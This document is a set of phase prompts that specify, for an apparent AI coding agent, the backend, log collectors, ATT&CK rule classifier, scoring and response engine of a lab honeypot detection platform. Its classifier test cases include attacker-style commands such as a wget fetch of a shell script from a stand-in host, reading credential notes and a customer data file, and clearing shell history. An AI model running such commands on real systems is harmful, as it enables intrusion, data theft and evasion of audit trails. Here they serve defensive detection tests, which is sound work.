# 03 — Phase Prompts: Backend, Detection Engine, Response (P8 – P14)

> Engine prompts are **tests-first**. The engine functions are pure (dict in, dict out), so they are cheap to verify.

---

## P8 — Backend scaffold: schema + database

```text
ROLE
Senior Python backend engineer (FastAPI, SQLAlchemy 2, pydantic v2).

CONTEXT
Read AGENTS.md, docs/06B sections 1-3. Frozen contracts in the master context apply.

TASK
1. backend/requirements.txt with PINNED versions: fastapi, uvicorn[standard], sqlalchemy>=2, psycopg[binary],
   pydantic>=2, pyyaml, python-dateutil, pytest, httpx.
2. backend/Dockerfile (python:3.11-slim, non-root user, uvicorn app.main:app).
3. backend/app/schema.py: NormalizedEvent exactly per the frozen contract (pydantic v2, sensible defaults,
   use default_factory for lists/dicts - no shared mutable defaults).
4. backend/app/db.py: SQLAlchemy models EventRow, IncidentRow, ActionRow (see docs/06B section 3).
   Support Postgres via DATABASE_URL and fall back to SQLite for local tests. Index ts, src_ip, session_id, zone.
5. backend/app/main.py: minimal FastAPI app with GET /health and GET /api/stats returning zeros for now.
6. Wire the api service in docker-compose.yml (depends_on db; add a healthcheck for db and a retry loop for
   table creation so the API survives postgres start-up delay).

CONSTRAINTS
- No business logic yet. No f-string SQL. Parametrized ORM only.
- CORS: allow all origins ONLY because this is a lab; leave a comment saying so.

ACCEPTANCE
- docker compose up -d --build db api; curl localhost:8000/health -> {"status":"ok"}
- curl localhost:8000/docs -> 200
- pytest -q (add one trivial schema round-trip test) passes

OUTPUT
Files, versions pinned, gaps.
```

---

## P9 — Collector: tailers, parsers, alias map, scan detector

```text
ROLE
Backend engineer who writes robust log ingestion.

CONTEXT
Read docs/06B section 4. P5 and P2-P4, P6 produced real log lines; use REAL samples from the running
honeypots (docker compose exec ... tail) to validate parsers, especially OpenCanary.

TASK
1. backend/app/geo.py: display_ip() alias map (172.28.0.50 and 172.29.0.50 -> 203.0.113.50;
   172.28.0.100+ -> 198.51.100.x) and geo(ip) returning (country, asn) from a static table (offline).
2. backend/app/collector.py implementing:
   - parse_cowrie, parse_portal, parse_opencanary, parse_tripwire, parse_prod -> dict or None
   - SENSORS map (source -> sensor name, zone)
   - scan_event(): >=4 distinct dst ports from one src IP within 10 s -> ONE synthetic action="scan" event
     per IP per 5 minutes, sensor "scan-detector"
   - tail(): async tailer with persisted OFFSETS (store offsets in a small file/db so API restarts do not
     replay old lines -> duplicates), partial-line safety, JSON decode errors ignored (logged at debug),
     file rotation/truncation handled (if size < offset, reset to 0)
   - start(on_event) creating one asyncio task per source
3. All parsed output validated through NormalizedEvent before being passed on. Invalid -> counted + dropped.
4. Unit tests (backend/tests/test_parsers.py) using fixtures of REAL sample lines (put them in
   backend/tests/fixtures/*.json): each parser maps the key fields; malformed line returns None;
   scan detector fires on 4 ports and not on 3; same-port repeats do not count.

CONSTRAINTS
- Treat every field as untrusted: coerce types, truncate strings (e.g. cmd/password to 1024 chars),
  strip control characters except \n\t in stored command text.
- No blocking file I/O inside the event loop for large files (read in chunks, yield with await asyncio.sleep).

ACCEPTANCE
- pytest -q passes
- Manually generate honeypot activity, then: curl localhost:8000/api/events?limit=5 shows normalized events
  from at least cowrie and portal with correct sensor/zone and display IPs.
- Restart the api container; confirm NO duplicate events appear.

OUTPUT
Files, which log formats differed from the docs, gaps.
```

---

## P10 — ATT&CK YAML rules + classifier (tests first)

```text
ROLE
Detection engineer (ATT&CK mapping, rule design).

CONTEXT
docs/06B section 5.1-5.2, docs/07 sections 3-4. Note: MITRE ATT&CK v19 deprecated Defense Evasion
(split into Stealth and Impair Defenses). Tactic labels are DATA in YAML, technique IDs are stable.

TASK (write failing tests first, then implement)
1. backend/app/engine/attack_map.yaml: techniques dict (id -> name, tactic), stage_order, and rules list
   exactly as in docs/06B 5.1. Add an `attack_version` field. Add rules for: scan, connect, auth fail,
   auth ok, web exploit flags, shell, sysinfo, whoami, ls, ps, cred files, crown jewel, archive, tool
   download, persistence ssh/cron, history clearing, miner, download (exfil), upload, honeytoken use.
2. backend/tests/test_classify.py - table-driven tests:
   "ls /srv/backups" -> T1083, stage discovery
   "cat /srv/backups/customer_data_2026.csv" -> T1005 + flag crown_jewel, stage collection
   "cat /home/dbadmin/notes.txt" -> T1552.001
   "wget http://x/y.sh" -> T1105
   "history -c" -> T1070.003
   failed auth -> T1110.001; successful auth -> T1078.001
   auth with flag honeytoken_use -> T1078 + T1021.004, stage lateral_movement, flag honeytoken
   portal login with flag sqli -> T1190
   unknown command "foobar" -> only T1059.004, stage execution
3. backend/app/engine/classify.py: load YAML once (validate that every technique id referenced by a rule
   exists in `techniques`, raise a clear error at import otherwise); classify(ev) -> ev with techniques,
   stage (highest stage by stage_order), category, flags.

CONSTRAINTS
- classify must be PURE (no I/O after load) and deterministic.
- Regexes compiled once; guard against catastrophic backtracking (keep patterns simple, test with 10k-char input).
- Do not hard-code technique logic in Python - rules live in YAML.

ACCEPTANCE
- pytest -q backend/tests/test_classify.py all green
- python -c "import app.engine.classify" validates the YAML

OUTPUT
Files, count of rules and techniques, gaps.
```

---

## P11 — Evaluator: sessions, cadence, correlation, scoring, verdict

```text
ROLE
Detection engineer / security data scientist (rule-based, explainable).

CONTEXT
docs/07 (entire file), docs/06B section 5.3. The Incident JSON contract is frozen.

TASK (tests first)
1. backend/tests/test_evaluate.py covering the worked examples in docs/07 section 5.5:
   A. botnet drive-by (one failed login with a common password, no commands) -> score 0, low, opportunistic
   B. targeted attacker (scan -> login success -> human-cadence commands incl. customer_data -> portal download
      -> prod honeytoken auth + prod firewall allow) -> clamp 100, critical, targeted, real_asset_touched,
      honeytoken_hit, factors list contains each expected label with points
   C. login success + `ls` only with human cadence, non-wordlist password -> high, verdict opportunistic
      (targeted points < 3) ... adjust the test to the exact rule in docs/07 and explain any difference
   D. benign internal prod traffic (10.x) never produces an incident
   E. cadence(): 5 commands 0.1 s apart -> "bot"; gaps 2-5 s with variance -> "human"; <3 commands -> "unknown"
   F. override: honeytoken or real-asset touch -> critical even when raw score < 85
2. backend/app/engine/evaluate.py: evaluate(src_ip, events) -> incident dict per the frozen contract.
   Pure function. Includes: max stage, techniques detail, factors, severity+override, verdict (targeted
   points vs noise points per docs/07 5.4), profile, timeline (without fingerprint noise), transcript,
   files, real_asset_events (cap 20), narrative generator (deterministic template, no LLM).
3. Ensure factor labels are human-readable and include signed points (negative for noise factors).
4. Add `score_breakdown_sum` sanity: sum(factor.points) clamped equals score.

CONSTRAINTS
- Pure + deterministic: the same events in any input order -> the same incident (sort by ts internally).
- Handle empty lists, missing fields, and ISO timestamps with/without 'Z' safely.
- Performance: 1,000 events evaluates in < 50 ms.

ACCEPTANCE
- pytest -q all green, with a printed timing for the 1,000-event test.

OUTPUT
Files, any rule ambiguities you resolved (list them), gaps.
```

---

## P12 — API, WebSocket, live incident upsert

```text
ROLE
Backend engineer (FastAPI, async, WebSockets).

CONTEXT
docs/06B section 6. Collector (P9), classify (P10), evaluate (P11) are done.

TASK
Implement backend/app/main.py fully:
1. startup: create tables (with retry), start collector with on_event.
2. on_event(ev): classify -> persist EventRow -> broadcast {"kind":"event"} -> skip incident evaluation for
   benign internal production traffic (10.x) -> evaluate(src_ip, last 30 min of events for that IP across
   BOTH zones) -> upsert IncidentRow (id "INC-<ip>"), keep existing status and previously-generated actions
   (regenerate recommendations only if absent or severity increased) -> broadcast {"kind":"incident"}.
3. Endpoints exactly per the frozen contract: /api/stats (raw_events, incidents, critical_open,
   opportunistic, noise_suppressed_pct, contained), /api/events?limit, /api/incidents (sorted by severity
   then score), /api/incidents/{id}, /api/attack-matrix, /api/export/ecs.ndjson,
   /api/incidents/{id}/export/stix|csv, POST actions (approve|dry_run), POST /api/demo/{targeted|noise},
   POST /api/demo/reset (declare BEFORE the parametrized demo route).
4. WebSocket /ws/live: accept, keep-alive, dead client cleanup; broadcast must never raise.
5. Serialize concurrency: guard incident upsert per src_ip with an asyncio.Lock dict so two simultaneous
   events do not clobber each other. DB access in a threadpool (or use async SQLAlchemy) so the event loop
   is not blocked.

CONSTRAINTS
- Time-window query must use real datetime comparison or consistent ISO string format - document which.
- Never trust path params: 404 for unknown incident, 400 for bad scenario/action.
- Blocking an IP must write ALL raw container IPs that map to the display IP (reverse alias lookup).

ACCEPTANCE
- Start the whole stack, run a manual attack from a throwaway container, and show:
  curl /api/incidents (one INC with severity), curl /api/stats
- websocat/wscat ws://localhost:8000/ws/live prints events live (show 5 lines)
- pytest -q still green; add 3 API tests with httpx TestClient (stats, incidents ordering, 404)

OUTPUT
Endpoint table with example responses, gaps.
```

---

## P13 — Response engine, hunt queries, STIX/CSV export

```text
ROLE
SOAR / threat-intel engineer.

CONTEXT
docs/06B sections 5.5-5.6, docs/07 section 9, docs/09 section 7.

TASK (tests first)
1. engine/respond.py: recommend(incident) -> list of actions {id,type,title,why,params,requires_approval,status}.
   Rules per docs/07 section 9: block_source (severity>=high), isolate_host + hunt (real asset touched; hunt
   returns Splunk SPL and KQL strings with the IP safely quoted), rotate_credentials (honeytoken hit),
   export_iocs (always, no approval), monitor (low only).
2. execute(action, dry_run): block_source writes raw IPs to /shared/blocklist.txt (idempotent, no duplicates,
   atomic write via temp file + rename) and returns the equivalent nft command; dry_run NEVER writes;
   isolate_host and rotate_credentials are simulated and return a clear string.
3. Safety: an ALLOWLIST (config, default empty in lab mode with a visible flag) of never-block IPs/CIDRs;
   attempts to block an allowlisted IP raise a clear error. Validate IPs with the ipaddress module BEFORE
   composing any command string (prevent command/pattern injection in the printed commands).
4. engine/stix.py: STIX 2.1 bundle (indicator for the IP, indicator per file sha256, attack-pattern per
   technique with external_references to attack.mitre.org), valid UUIDs and timestamps; csv_iocs().
   Tests: bundle is valid JSON, ids prefixed correctly, IP validated, no duplicate objects.
5. Record every executed/dry-run action in ActionRow with who/when/mode/result (who = "analyst" for now).

ACCEPTANCE
- pytest -q green (including: dry_run does not touch the blocklist; blocking twice yields one line;
  invalid IP rejected; allowlisted IP rejected)
- curl .../export/stix | python -m json.tool passes; optionally validate with the `stix2` lib if available

OUTPUT
Files, example action JSON, example STIX excerpt, gaps.
```

---

## P14 — Backend hardening pass + test consolidation

```text
ROLE
Application security engineer reviewing your own backend.

TASK
1. Audit backend/ for: untrusted-input handling in parsers, ReDoS-prone regexes, SQL injection, path
   traversal on any file path built from input, unbounded memory growth (WebSocket clients, in-memory dicts
   such as scan detector deques), and error paths that leak internals.
2. Fix issues found; add regression tests for each.
3. Add structured logging (logging module), a /api/health with DB + collector status (events/min, last event ts),
   and bounded caches (evict old IPs from scan-detector state).
4. Run pytest with coverage; report coverage for engine/ and collector.py. Aim for >85% on engine/.

ACCEPTANCE
pytest -q --cov=app --cov-report=term-missing output; list of findings with severity and the fix.

OUTPUT
Findings table (issue, risk, fix, test), remaining risks.
```
